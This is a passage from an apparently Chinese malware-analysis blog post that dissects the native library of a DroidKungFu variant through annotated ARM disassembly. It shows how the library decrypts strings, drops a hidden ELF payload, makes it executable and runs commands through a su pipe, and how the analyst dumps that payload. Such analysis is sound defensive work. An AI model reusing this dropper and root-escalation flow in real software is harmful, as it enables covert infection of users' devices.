class="built_in">R4</span>-<span class="built_in">R7</span>&#125;     <span class="comment">;将R8-R11寄存器的值压入堆栈</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000948</span>                 <span class="keyword">LDR</span>     <span class="built_in">R4</span>, <span class="number">=0xFFFFFDE4</span>  <span class="comment">;将内存地址中的数据传给寄存器R4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000094</span>A                 <span class="keyword">MOVS</span>    <span class="built_in">R7</span>, <span class="built_in">R3</span>           <span class="comment">;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000094</span>C                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, =(__stack_chk_guard_ptr - <span class="number">0x10C8</span>)<span class="comment">;相对GOT表的偏移</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000094</span>E                 <span class="keyword">ADD</span>     <span class="built_in">SP</span>, <span class="built_in">R4</span>           :开辟栈的空间，加<span class="built_in">R4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000950</span>                 <span class="keyword">LDR</span>     <span class="built_in">R4</span>, =(_GLOBAL_OFFSET_TABLE_ - <span class="number">0x95A</span>) <span class="comment">;保存数据存取的基址</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000952</span>                 <span class="keyword">MOV</span>     <span class="built_in">R9</span>, <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000954</span>                 <span class="keyword">LDR</span>     <span class="built_in">R1</span>, [<span class="built_in">SP</span>,<span class="number">#0x240</span>+arg_0]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000956</span>                 <span class="keyword">ADD</span>     <span class="built_in">R4</span>, <span class="built_in">PC</span>          <span class="comment">; _GLOBAL_OFFSET_TABLE_</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000958</span>                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R4</span>,<span class="built_in">R3</span>]     <span class="comment">; __stack_chk_guard</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000095</span>A                 <span class="keyword">MOVS</span>    <span class="built_in">R6</span>, <span class="number">#0x2A4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000095</span>E                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R3</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000960</span>                 <span class="keyword">MOV</span>     <span class="built_in">R8</span>, <span class="built_in">R1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000962</span>                 <span class="keyword">MOVS</span>    <span class="built_in">R1</span>, <span class="built_in">R2</span>          <span class="comment">;Android设备ID</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000964</span>                 <span class="keyword">STR</span>     <span class="built_in">R3</span>, [<span class="built_in">SP</span>,<span class="number">#0x240</span>+var_2C] <span class="comment">;保存R3寄存器，用于堆栈完整性检查</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000966</span>                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R0</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000968</span>                 <span class="keyword">MOVS</span>    <span class="built_in">R2</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000096</span>A                 <span class="keyword">MOVS</span>    <span class="built_in">R5</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000096</span>C                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R3</span>,<span class="built_in">R6</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000096</span>E                 <span class="keyword">BLX</span>     <span class="built_in">R3</span>             :跳转到<span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000970</span>                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R5</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000972</span>                 <span class="keyword">MOV</span>     <span class="built_in">R11</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000974</span>                 <span class="keyword">MOVS</span>    <span class="built_in">R1</span>, <span class="built_in">R7</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000976</span>                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R3</span>,<span class="built_in">R6</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000978</span>                 <span class="keyword">MOVS</span>    <span class="built_in">R0</span>, <span class="built_in">R5</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000097</span>A                 <span class="keyword">MOVS</span>    <span class="built_in">R2</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000097</span>C                 <span class="keyword">BLX</span>     <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000097</span>E                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R5</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000980</span>                 <span class="keyword">MOV</span>     <span class="built_in">R1</span>, <span class="built_in">R8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000982</span>                 <span class="keyword">MOV</span>     <span class="built_in">R10</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000984</span>                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R3</span>,<span class="built_in">R6</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000986</span>                 <span class="keyword">MOVS</span>    <span class="built_in">R0</span>, <span class="built_in">R5</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000988</span>                 <span class="keyword">MOVS</span>    <span class="built_in">R2</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000098</span>A                 <span class="keyword">BLX</span>     <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000098</span>C                 <span class="keyword">MOV</span>     <span class="built_in">R1</span>, <span class="built_in">R11</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000098</span>E                 <span class="keyword">MOVS</span>    <span class="built_in">R5</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000990</span>                 <span class="keyword">MOVS</span>    <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000992</span>                 <span class="keyword">CMP</span>     <span class="built_in">R1</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000994</span>                 <span class="keyword">BNE</span>     loc_998       :与cmp搭配，BNE不相等跳转，比较<span class="built_in">R1</span>和<span class="number">0</span>，不相等则跳转到loc_998</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000996</span>                 <span class="keyword">B</span>       loc_B1C       <span class="comment">;直接跳转到loc_B1</span></span><br></pre></td></tr></table></figure>
+
+<p>在上述代码中值得注意的是”<strong>LDR     R3, [R4,R3]</strong> “这一条指令，可以看到其后面的注释为”<strong>_stack_chk_guard</strong>“，这是软件安全技术中的堆栈保护技术(GCC Stack Smashing Protector)的一部分，用来防止堆栈溢出造成的溢出漏洞攻击，生成的代码会被添加上堆栈保护代码。在Android系统源代码的bionic\libc\bionic\ssp.c文件中可以看到其实现机制，由_guard_setup()函数设置，是&#x2F;dev&#x2F;urandom设备生成的一个随机数。我们再来看看函数返回时相应的处理代码loc_B1C：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:00000B1C loc_B1C                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+5A↑j</span><br><span class="line">.text:00000B1C                                         ; Java_com_airpuh_ad_UpdateCheck_DataInit+206↓j</span><br><span class="line">.text:00000B1C                 MOV     R2, R9</span><br><span class="line">.text:00000B1E                 LDR     R3, [R4,R2]     ; __stack_chk_guard</span><br><span class="line">.text:00000B20                 LDR     R2, [SP,#0x240+var_2C]</span><br><span class="line">.text:00000B22                 LDR     R3, [R3]</span><br><span class="line">.text:00000B24                 CMP     R2, R3</span><br><span class="line">.text:00000B26                 BNE     loc_B5C</span><br><span class="line">.text:00000B28                 MOVS    R3, #0x21C</span><br><span class="line">.text:00000B2C                 ADD     SP, R3</span><br><span class="line">.text:00000B2E                 POP     &#123;R2-R5&#125;</span><br><span class="line">.text:00000B30                 MOV     R8, R2</span><br><span class="line">.text:00000B32                 MOV     R9, R3</span><br><span class="line">.text:00000B34                 MOV     R10, R4</span><br><span class="line">.text:00000B36                 MOV     R11, R5</span><br><span class="line">.text:00000B38                 POP     &#123;R4-R7,PC&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数返回时重新读取堆栈上的值与原先_stack_chk_guard的值进行比较。</p>
+<p>我们继续跟踪loc_998，首先跳转到init_predata，然后通过判断java代码传递过来的META DATA是否为空，若为空则跳转到loc_B54，否则就跳转到loc_9A4</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00000998 loc_998                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+58↑j</span><br><span class="line">.text:00000998                 BL      init_predata</span><br><span class="line">.text:0000099C                 MOV     R2, R10</span><br><span class="line">.text:0000099E                 CMP     R2, #0</span><br><span class="line">.text:000009A0                 BNE     loc_9A4</span><br><span class="line">.text:000009A2                 B       loc_B54</span><br></pre></td></tr></table></figure>
+
+<p>先来看init_predata函数，该函数功能是进行<strong>字符串解密操作</strong>，程序运行时需要将之前加密的字符串进行动态的解密操作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">.text:00000894 init_predata                            ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit:loc_998↓p</span><br><span class="line">.text:00000894                                         ; DATA XREF: LOAD:00000018↑o ...</span><br><span class="line">.text:00000894 ; __unwind &#123;</span><br><span class="line">.text:00000894                 BLMI    0x8D2D24</span><br><span class="line">.text:00000898                 STMPL   R11, &#123;R0,R3-R6,R10,LR&#125;^</span><br><span class="line">.text:0000089C                 BCS     0x1E90C</span><br><span class="line">.text:000008A0                 BICSMI  SP, R2, #5</span><br><span class="line">.text:000008A4                 MOVWCC  R7, #0x101A</span><br><span class="line">.text:000008A8                 BCS     0x1E918</span><br><span class="line">.text:000008AC                 BLMI    0x7B5098</span><br><span class="line">.text:000008B0                 LDMDAVC R10, &#123;R0,R1,R3,R6,R7,R11,R12,LR&#125;</span><br><span class="line">.text:000008B4                 ANDLE   R2, R5, R0,LSL#20</span><br><span class="line">.text:000008B8                 LDRSBVC R4, [R10],-R2</span><br><span class="line">.text:000008BC                 LDMDAVC R10, &#123;R0,R8,R9,R12,SP&#125;</span><br><span class="line">.text:000008C0                 MVNSLE  R2, R0,LSL#20</span><br><span class="line">.text:000008C4                 STMPL   R11, &#123;R0,R3,R4,R8,R9,R11,LR&#125;^</span><br><span class="line">.text:000008C8                 BCS     0x1E938</span><br><span class="line">.text:000008CC                 BICSMI  SP, R2, #5</span><br><span class="line">.text:000008D0                 MOVWCC  R7, #0x101A</span><br><span class="line">.text:000008D4                 BCS     0x1E944</span><br><span class="line">.text:000008D8                 BLMI    0x5750C4</span><br><span class="line">.text:000008DC                 LDMDAVC R10, &#123;R0,R1,R3,R6,R7,R11,R12,LR&#125;</span><br><span class="line">.text:000008E0                 ANDLE   R2, R5, R0,LSL#20</span><br><span class="line">.text:000008E4                 LDRSBVC R4, [R10],-R2</span><br><span class="line">.text:000008E8                 LDMDAVC R10, &#123;R0,R8,R9,R12,SP&#125;</span><br><span class="line">.text:000008EC                 MVNSLE  R2, R0,LSL#20</span><br><span class="line">.text:000008F0                 STMPL   R11, &#123;R4,R8,R9,R11,LR&#125;^</span><br><span class="line">.text:000008F4                 BCS     0x1E964</span><br><span class="line">.text:000008F8                 BICSMI  SP, R2, #5</span><br><span class="line">.text:000008FC                 MOVWCC  R7, #0x101A</span><br><span class="line">.text:00000900                 BCS     0x1E970</span><br><span class="line">.text:00000904                 BLMI    0x3350F0</span><br><span class="line">.text:00000908                 LDMDAVC R10, &#123;R0,R1,R3,R6,R7,R11,R12,LR&#125;</span><br><span class="line">.text:0000090C                 ANDLE   R2, R5, R0,LSL#20</span><br><span class="line">.text:00000910                 LDRSBVC R4, [R10],-R2</span><br><span class="line">.text:00000914                 LDMDAVC R10, &#123;R0,R8,R9,R12,SP&#125;</span><br><span class="line">.text:00000918                 MVNSLE  R2, R0,LSL#20</span><br><span class="line">.text:0000091C                 CODE16</span><br><span class="line">.text:0000091C                 BX      LR</span><br><span class="line">.text:0000091C ; End of function init_predata</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是<strong>释放病毒主体</strong>，当META DATA为空时，跳转到local_B54将R10设置为“self”字符串地址，然后跳转到loc_9A4</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00000B54 loc_B54                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+66↑j</span><br><span class="line">.text:00000B54                 LDR     R3, =(__data_start_ptr - 0x10C8)</span><br><span class="line">.text:00000B56                 LDR     R3, [R4,R3]     ; __data_start</span><br><span class="line">.text:00000B58                 MOV     R10, R3</span><br><span class="line">.text:00000B5A                 B       loc_9A4</span><br></pre></td></tr></table></figure>
+
+<p>当META DATA不为空时，也直接跳转到loc_9A4.继续跟踪loc_9A4</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">.text:000009A4 loc_9A4                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+64↑j</span><br><span class="line">.text:000009A4                                         ; Java_com_airpuh_ad_UpdateCheck_DataInit+21E↓j</span><br><span class="line">.text:000009A4                 ADD     R6, SP, #0x240+s</span><br><span class="line">.text:000009A6                 MOVS    R2, #0x80</span><br><span class="line">.text:000009A8                 MOVS    R1, #0          ; 填0</span><br><span class="line">.text:000009AA                 LSLS    R2, R2, #1      ; 填入长度0x100</span><br><span class="line">.text:000009AC                 MOVS    R0, R6          ; 缓冲区</span><br><span class="line">.text:000009AE                 BLX     memset          : 清空一个存储空间用来存入sprintf组成的字符串</span><br><span class="line">.text:000009B2                 ADD     R0, SP, #0x240+timer ; timer</span><br><span class="line">.text:000009B4                 BLX     time            ; 获取系统时间作为随机种子</span><br><span class="line">.text:000009B8                 LDR     R0, [SP,#0x240+timer] ; seedval</span><br><span class="line">.text:000009BA                 BLX     srand48</span><br><span class="line">.text:000009BE                 BLX     lrand48         ; 生成的随机数作为释放的恶意文件名</span><br><span class="line">.text:000009C2                 LDR     R1, =(aSSEDd - 0x9CC) ; &quot;%s/%s/.e%dd&quot;</span><br><span class="line">.text:000009C4                 LDR     R2, =(aDataData - 0x9CE) ; &quot;/data/data&quot;</span><br><span class="line">.text:000009C6                 STR     R0, [SP,#0x240+var_240]</span><br><span class="line">.text:000009C8                 ADD     R1, PC          ; &quot;%s/%s/.e%dd&quot;</span><br><span class="line">.text:000009CA                 ADD     R2, PC          ; &quot;/data/data&quot;</span><br><span class="line">.text:000009CC                 MOVS    R0, R6          ; 赋予前面meset的缓冲区</span><br><span class="line">.text:000009CE                 MOVS    R3, R5</span><br><span class="line">.text:000009D0                 BLX     sprintf</span><br><span class="line">.text:000009D4                 MOVS    R2, #0xC0</span><br><span class="line">.text:000009D6                 MOVS    R0, R6          ; file</span><br><span class="line">.text:000009D8                 LDR     R1, =0x242      ; oflag</span><br><span class="line">.text:000009DA                 LSLS    R2, R2, #1</span><br><span class="line">.text:000009DC                 BLX     open            ; 创建恶意文件</span><br><span class="line">.text:000009E0                 SUBS    R7, R0, #0</span><br><span class="line">.text:000009E2                 BGE     loc_9E6</span><br><span class="line">.text:000009E4                 B       loc_B3A</span><br><span class="line"></span><br><span class="line">.text:000009E6 loc_9E6                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+A6↑j</span><br><span class="line">.text:000009E6                 LDR     R3, =(__bindata_ptr - 0x10C8)</span><br><span class="line">.text:000009E8                 MOVS    R0, R7          ; fd</span><br><span class="line">.text:000009EA                 LDR     R1, [R4,R3]     ; __bindata ; buf</span><br><span class="line">.text:000009EC                 LDR     R3, =aEncodingUtf8St ; &quot;encoding=&#x27;utf-8&#x27; standalone=&#x27;yes&#x27; ?&gt;\n&quot;</span><br><span class="line">.text:000009EE                 MOVS    R2, R3          ; n</span><br><span class="line">.text:000009F0                 MOV     R8, R3</span><br><span class="line">.text:000009F2                 BLX     write           ; 写入恶意文件</span><br><span class="line">.text:000009F6                 MOVS    R5, R0          ; 实际写入的长度</span><br><span class="line">.text:000009F8                 MOVS    R0, R7          ; fd</span><br><span class="line">.text:000009FA                 BLX     close</span><br><span class="line">.text:000009FE                 BLX     sync            ; 强制刷新</span><br><span class="line">.text:00000A02                 BLX     sync</span><br><span class="line">.text:00000A06                 MOVS    R0, R6          ; file</span><br><span class="line">.text:00000A08                 LDR     R1, =0x1ED      ; 775u</span><br><span class="line">.text:00000A0A                 BLX     chmod           ; 赋予可执行权限 </span><br><span class="line">.text:00000A0E                 CMP     R5, R8</span><br><span class="line">.text:00000A10                 BEQ     loc_A14</span><br><span class="line">.text:00000A12                 B       loc_B3A</span><br></pre></td></tr></table></figure>
+
+<p>首先调用meset()函数清空内存区域用于后面存入病毒文件名，使用time()获取系统时间，使用lrand48()对获取的系统时间生成随机数，病毒文件名采用”.e&lt;随机数&gt;d”的格式生成文件名，该文件为隐藏文件。构造好完整的病毒文件后，调用open()函数创建了病毒文件，接着使用write()函数写入文件，写入的内容起始地址指向____bindata ， 跳转到该地址，可以看到前4个字节为”7F  45  4C  46”,这四个字节为ELF文件的标识</p>
+<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231011204037945.png" class title="image-20231011204037945">
+
+<p>写入长度为0x699c，文件大小为27036字节，文件写完后使用close()关闭文件流，sync()函数强制刷新，chmod()函数添加执行权限。病毒发作后，在进程中无法找到生成的病毒主体，是由于在执行完主体后调用unlink()函数将其删除。所以需要我们去手工dump下来病毒主体，使用二进制编辑器打开libvadgo.so文件，直接跳转到病毒主体起始地址0x1194，如下所示开头为ELF标准的文件开头。</p>
+<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231012173510390.png" class title="image-20231012173510390">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>选取0x1194到0x7b30的内容另存为evil.bin文件，该文件即位病毒主体。</p>
+<img src="/2023/03/12/DroidKonngFu%E5%8F%98%E7%A7%8D%E7%97%85%E6%AF%92%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/image-20231012174700067.png" class title="image-20231012174700067">
+
+<p>病毒主体释放完就是<strong>开启su权限管道</strong>，代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:00000A14 loc_A14                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+D4↑j</span><br><span class="line">.text:00000A14                 LDR     R3, =(SYS_BIN_SU_ptr - 0x10C8)  </span><br><span class="line">.text:00000A16                 MOVS    R1, #0          ; type</span><br><span class="line">.text:00000A18                 LDR     R5, [R4,R3]     ; SYS_BIN_SU</span><br><span class="line">.text:00000A1A                 MOVS    R0, R5          ; name</span><br><span class="line">.text:00000A1C                 BLX     access          ; 判断/system/bin/su是否可以访问</span><br><span class="line">.text:00000A20                 CMP     R0, #0          ; 当R0==0时表示文件可访问</span><br><span class="line">.text:00000A22                 BEQ     loc_A26         ; 文件可访问就popen(“/system/bin/su”，w)</span><br><span class="line">.text:00000A24                 B       loc_B44         ; 不可访问就popen(&quot;/system/xbin/su&quot;,w)</span><br><span class="line">.text:00000A26 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000A26</span><br><span class="line">.text:00000A26 loc_A26                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+E6↑j</span><br><span class="line">.text:00000A26                 LDR     R1, =(aW - 0xA2E) ; &quot;w&quot;</span><br><span class="line">.text:00000A28                 MOVS    R0, R5          ; command</span><br><span class="line">.text:00000A2A                 ADD     R1, PC          ; &quot;w&quot;</span><br><span class="line">.text:00000A2C                 BLX     popen           ; 创建管道运行/system/bin/su</span><br><span class="line">.text:00000A30                 ADDS    R7, R0, #0</span><br><span class="line">.text:00000A32</span><br><span class="line">.text:00000A32 loc_A32                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+216↓j</span><br><span class="line">.text:00000A32                 CMP     R7, #0          ; 判断管道是否创建成功，成功的话R7不等于0</span><br><span class="line">.text:00000A34                 BNE     loc_A38         ; 成功则调用loc_A38执行病毒本体</span><br><span class="line">.text:00000A36                 B       loc_B3A         ; 否则删除病毒本体后退出</span><br></pre></td></tr></table></figure>
+
+<p>通过access()函数判断su可执行程序的路径，su是系统权限提升程序，所以病毒在运行前需要保证手机已经ROOT(在程序开头就对设备的ROOT权限进行了判断)。在检测完su的程序路径后，调用popen()函数创建管道，如果系统中存在su权限管理程序则弹出权限请求程序对话框。接着再判断管道是否创建成功，成功则跳转到loc_A38执行病毒本体，否则就跳转到loc_B3A删除病毒本体然后退出函数。</p>
+<p>在上述的创建管道成功后，接下来就是<strong>执行病毒本体</strong>，代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">.text:00000A38 loc_A38                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+F8↑j</span><br><span class="line">.text:00000A38                 ADD     R5, SP, #0x240+var_12C</span><br><span class="line">.text:00000A3A                 MOVS    R1, #0          ; c</span><br><span class="line">.text:00000A3C                 MOVS    R2, #0xFF       ; n</span><br><span class="line">.text:00000A3E                 MOVS    R0, R5          ; s</span><br><span class="line">.text:00000A40                 BLX     memset</span><br><span class="line">.text:00000A44                 LDR     R3, =(CMD_SET_PROP_ptr - 0x10C8)</span><br><span class="line">.text:00000A46                 LDR     R1, =(aSSS - 0xA52) ; &quot;%s %s %s\n&quot;</span><br><span class="line">.text:00000A48                 MOV     R2, R11</span><br><span class="line">.text:00000A4A                 LDR     R3, [R4,R3]     ; CMD_SET_PROP</span><br><span class="line">.text:00000A4C                 MOV     R8, R1</span><br><span class="line">.text:00000A4E                 ADD     R8, PC          ; &quot;%s %s %s\n&quot;</span><br><span class="line">.text:00000A50                 STR     R3, [SP,#0x240+var_234]  ;字符串&quot;/system/bin/setprop&quot;</span><br><span class="line">.text:00000A52                 LDR     R3, =(PROP_RUNNING_ID_ptr - 0x10C8)</span><br><span class="line">.text:00000A54                 MOV     R1, R8          ; format格式化字符串</span><br><span class="line">.text:00000A56                 STR     R2, [SP,#0x240+var_240]</span><br><span class="line">.text:00000A58                 LDR     R3, [R4,R3]     ; PROP_RUNNING_ID (r0.bot.id)</span><br><span class="line">.text:00000A5A                 LDR     R2, [SP,#0x240+var_234]</span><br><span class="line">.text:00000A5C                 MOVS    R0, R5          ; s</span><br><span class="line">.text:00000A5E                 BLX     sprintf</span><br><span class="line">.text:00000A62                 MOVS    R0, R5          ; char * &quot;/system/bin/setprop ro.bot.idandroid_id\n&quot;</span><br><span class="line">.text:00000A64                 BLX     strlen          ; 计算组合后的字符串长度</span><br><span class="line">.text:00000A68                 MOVS    R3, R7          ; s 管道fd</span><br><span class="line">.text:00000A6A                 MOVS    R2, R0          ; n 要写入的字节长度</span><br><span class="line">.text:00000A6C                 MOVS    R1, #1          ; size 按字节计算</span><br><span class="line">.text:00000A6E                 MOVS    R0, R5          ; ptr  要写入的命令&quot;/system/bin/setprop ro.bot.idandroid_id\n&quot;</span><br><span class="line">.text:00000A70                 BLX     fwrite          ; 写入命令到管道</span><br><span class="line">.text:00000A74                 MOVS    R0, R7          ; stream 管道fd</span><br><span class="line">.text:00000A76                 BLX     fflush          ; 强制刷新</span><br><span class="line">.text:00000A7A                 MOVS    R1, #0          ; c</span><br><span class="line">.text:00000A7C                 MOVS    R2, #0xFF       ; n</span><br><span class="line">.text:00000A7E                 MOVS    R0, R5          ; s</span><br><span class="line">.text:00000A80                 BLX     memset</span><br><span class="line">.text:00000A84                 LDR     R3, =(PROP_RUNNING_CH_ptr - 0x10C8) </span><br><span 